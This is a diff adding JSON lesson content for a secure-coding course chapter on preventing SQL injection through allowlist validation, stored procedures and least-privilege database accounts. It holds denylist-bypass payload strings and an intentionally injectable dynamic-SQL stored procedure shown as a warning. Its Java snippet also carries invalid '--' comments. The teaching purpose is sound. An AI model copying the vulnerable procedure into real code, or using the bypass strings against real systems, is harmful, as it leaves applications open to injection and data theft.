+      "teaser": "Input validation is a defense-in-depth layer that reduces the attack surface before data reaches query-construction code. Allowlists (accept only known-good patterns) are the correct approach; denylists (reject known-bad patterns) are inherently incomplete and bypassable.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Input validation is not a substitute for parameterized queries — it is a complementary layer. An attacker who crafts a payload that evades validation still hits parameterized queries; parameterized queries stop the injection regardless. But validation catches malformed input early, reduces noise, and provides defense-in-depth."
+            }
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Allowlist validation",
+              "marks": ["bold"]
+            },
+            {
+              "text": " (also called positive validation) defines exactly what is acceptable and rejects everything else:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "python",
+          "text": "import re\n\n# ALLOWLIST — username must be alphanumeric + underscore, 3-32 chars\nUSERNAME_PATTERN = re.compile(r'^[a-zA-Z0-9_]{3,32}$')\n\ndef validate_username(username: str) -> bool:\n    return bool(USERNAME_PATTERN.match(username))\n\n# Any apostrophe, semicolon, parenthesis, or JNDI string fails immediately\n# before it ever reaches a database driver"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Denylist validation",
+              "marks": ["bold"]
+            },
+            {
+              "text": " (negative validation) attempts to block known-bad characters or strings. It fails in predictable ways:"
+            }
+          ]
+        },
+        {
+          "type": "list",
+          "style": "bulleted",
+          "items": [
+            [
+              {
+                "text": "Encoding bypass:",
+                "marks": ["bold"]
+              },
+              {
+                "text": " Attacker encodes "
+              },
+              {
+                "text": "'",
+                "marks": ["code"]
+              },
+              {
+                "text": " as "
+              },
+              {
+                "text": "%27",
+                "marks": ["code"]
+              },
+              {
+                "text": " or "
+              },
+              {
+                "text": "\\u0027",
+                "marks": ["code"]
+              },
+              {
+                "text": ". The denylist matches the literal apostrophe but not its encodings."
+              }
+            ],
+            [
+              {
+                "text": "Incomplete coverage:",
+                "marks": ["bold"]
+              },
+              {
+                "text": " Block "
+              },
+              {
+                "text": "SELECT",
+                "marks": ["code"]
+              },
+              {
+                "text": " but miss "
+              },
+              {
+                "text": "sElEcT",
+                "marks": ["code"]
+              },
+              {
+                "text": " or "
+              },
+              {
+                "text": "/**/SELECT/**/",
+                "marks": ["code"]
+              },
+              {
+                "text": " (comment-padded). SQL is case-insensitive and whitespace-flexible."
+              }
+            ],
+            [
+              {
+                "text": "Novel payloads:",
+                "marks": ["bold"]
+              },
+              {
+                "text": " Denylist matches known attack strings; attackers use new strings the denylist has never seen."
+              }
+            ]
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The correct approach: "
+            },
+            {
+              "text": "allowlist-validate input type, format, and range",
+              "marks": ["bold"]
+            },
+            {
+              "text": " (defense-in-depth), then "
+            },
+            {
+              "text": "parameterize all queries",
+              "marks": ["bold"]
+            },
+            {
+              "text": " (primary defense). Encode output for the rendering context (HTML encoding, JSON serialization) as a third layer."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Allowlists say 'only accept this specific pattern' — everything else is rejected. Denylists say 'block these known-bad things' — attackers just find the things you forgot to list. Use allowlists for validation and parameterized queries as your primary injection defense."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-ch03-c013",
+      "order": 13,
+      "title": "Stored Procedures and Least Privilege",
+      "teaser": "Stored procedures encapsulate SQL logic in the database, reducing the query surface and supporting least-privilege design. When used correctly, they provide a second line of defense; when used incorrectly — with dynamic SQL inside — they are vulnerable to the same injection they were meant to prevent.",
+      "explanation": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Stored procedures",
+              "marks": ["bold"]
+            },
+            {
+              "text": " are named, pre-compiled SQL routines stored in the database. An application calls the procedure by name and passes parameters — it does not construct SQL strings. The database engine separates query structure from data at the server level."
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "sql",
+          "text": "-- Database: define the procedure once\nCREATE PROCEDURE GetUser(@UserId INT)\nAS BEGIN\n    SELECT username, email FROM users WHERE id = @UserId;\nEND;\n\n-- Application: call with a parameter (Java example)\nCallableStatement cs = conn.prepareCall(\"{call GetUser(?)}\");\ncs.setInt(1, userId);  -- Bound as an integer parameter, not SQL\nResultSet rs = cs.executeQuery();"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "The trap: stored procedures that construct dynamic SQL internally using "
+            },
+            {
+              "text": "EXEC",
+              "marks": ["code"]
+            },
+            {
+              "text": " or "
+            },
+            {
+              "text": "sp_executesql",
+              "marks": ["code"]
+            },
+            {
+              "text": " with string concatenation are still vulnerable:"
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "sql",
+          "text": "-- VULNERABLE stored procedure — dynamic SQL with concatenation\nCREATE PROCEDURE SearchUsers(@SearchTerm NVARCHAR(100))\nAS BEGIN\n    DECLARE @sql NVARCHAR(500);\n    SET @sql = 'SELECT * FROM users WHERE username LIKE ''%' + @SearchTerm + '%''';\n    EXEC(@sql);  -- STILL INJECTABLE\nEND;"
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Least privilege at the database level",
+              "marks": ["bold"]
+            },
+            {
+              "text": " is the complementary control. The application's database account should have only the permissions it needs:"
+            }
+          ]
+        },
+        {
+          "type": "list",
+          "style": "bulleted",
+          "items": [
+            [
+              {
+                "text": "A read-only reporting user gets SELECT on specific tables only.",
+                "marks": []
+              }
+            ],
+            [
+              {
+                "text": "An application user gets EXECUTE on named stored procedures — no direct table access.",
+                "marks": []
+              }
+            ],
+            [
+              {
+                "text": "No application account should have DROP TABLE, CREATE USER, or xp_cmdshell access.",
+                "marks": []
+              }
+            ]
+          ]
+        },
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "With least privilege, even a successful SQL injection is limited to what the compromised account can do. An attacker who injects into a SELECT-only account cannot exfiltrate password hashes from a table they lack SELECT on, cannot write files, and cannot execute OS commands."
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "variant": "info",
+          "runs": [
+            {
+              "text": "Defense-in-depth stacking for SQL injection: (1) parameterized queries prevent injection; (2) stored procedures reduce the query surface; (3) least privilege limits blast radius if injection somehow succeeds; (4) allowlist input validation reduces noise. None of these replaces the others."
+            }
+          ]
+        }
+      ],
+      "feynman": [
+        {
+          "type": "paragraph",
+          "runs": [
+            {
+              "text": "Stored procedures put SQL in the database, not the app, and let you grant access to the procedure rather than to the tables directly. Least privilege means even a successful injection can only do what that database user is allowed to do — which should be very little."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
